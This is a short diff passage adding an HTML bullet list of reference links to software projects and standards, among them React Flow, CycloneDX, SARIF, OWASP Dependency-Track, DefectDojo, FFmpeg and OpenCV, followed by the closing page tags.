+<p class="bullet">• React Flow: https://reactflow.dev/</p>
+<p class="bullet">• CycloneDX: https://cyclonedx.org/specification/overview/</p>
+<p class="bullet">• SARIF: https://www.oasis-open.org/standard/sarif-v2-1-0/</p>
+<p class="bullet">• OWASP Dependency-Track: https://dependencytrack.org/</p>
+<p class="bullet">• DefectDojo: https://docs.defectdojo.com/</p>
+<p class="bullet">• FFmpeg: https://www.ffmpeg.org/index.html</p>
+<p class="bullet">• OpenCV: https://opencv.org/about/</p>
+
+</body></html>
